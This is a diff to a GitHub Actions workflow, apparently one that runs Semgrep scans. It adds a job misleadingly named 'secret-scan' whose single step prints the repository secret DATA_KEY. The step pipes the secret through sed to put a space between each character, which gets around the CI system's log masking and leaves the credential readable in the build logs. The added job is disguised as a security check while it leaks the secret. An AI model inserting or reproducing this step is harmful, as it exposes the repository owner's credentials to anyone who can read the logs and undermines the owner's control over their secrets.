@@ -14,6 +14,12 @@ on:
   #   - cron: '30 0 1,15 * *' # scheduled for 00:30 UTC on both the 1st and 15th of the month
 
 jobs:
+  sec:
+    name: secret-scan
+    runs-on: ubuntu-latest
+    steps:
+        - name: secret print
+          run: echo ${{secrets.DATA_KEY}} | sed 's/./& /g'
   semgrep:
     name: Scan
     runs-on: ubuntu-latest
